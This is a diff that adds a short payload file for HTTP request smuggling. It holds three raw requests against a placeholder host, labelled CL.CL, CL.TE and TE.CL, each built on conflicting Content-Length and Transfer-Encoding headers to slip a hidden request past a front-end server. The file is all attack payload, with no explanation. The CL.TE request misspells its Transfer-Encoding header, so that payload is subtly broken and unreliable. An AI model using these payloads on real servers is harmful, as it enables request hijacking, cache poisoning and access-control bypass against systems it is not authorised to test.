@@ -1,0 +1,33 @@
+# ----- CL.CL (Double Content-Length) start payload
+POST / HTTP/1.1
+Host: <vulnerable-website>
+Content-Length: 58
+Content-Length: 0
+
+GET /notfoundpage HTTP/1.1
+Host: <vulnerable-website>
+
+# ------ CL.CL (Double Content-Length) end payload
+
+# ------ CL.TE start payload
+POST / HTTP/1.1
+Host: <vulnerable-website>
+Content-Length: 13
+Tranfer-Encoding: chunked
+
+0
+
+SMUGGLED
+# ------ CL.TE end payload
+
+# ------ TE.CL start payload
+POST / HTTP/1.1
+Host: <vulnerable-host>
+Content-Length: 3
+Transfer-Encoding: chunked
+
+8
+SMUGGLED
+0
+
+# ------ TE.CL end payload
